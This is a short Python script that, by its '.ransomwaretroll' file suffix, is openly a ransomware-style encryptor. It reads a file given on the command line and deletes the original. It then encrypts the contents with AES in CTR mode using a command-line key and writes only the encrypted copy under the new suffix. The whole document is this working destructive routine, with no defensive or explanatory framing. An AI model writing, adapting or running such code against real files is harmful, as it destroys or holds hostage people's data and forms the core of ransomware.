import os
import pyaes
import sys

file_name = sys.argv[1]
encrypt_key = sys.argv[2]
encrypt_file_name_flag = '.ransomwaretroll'
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = bytes(encrypt_key, 'utf-8')
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + encrypt_file_name_flag
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
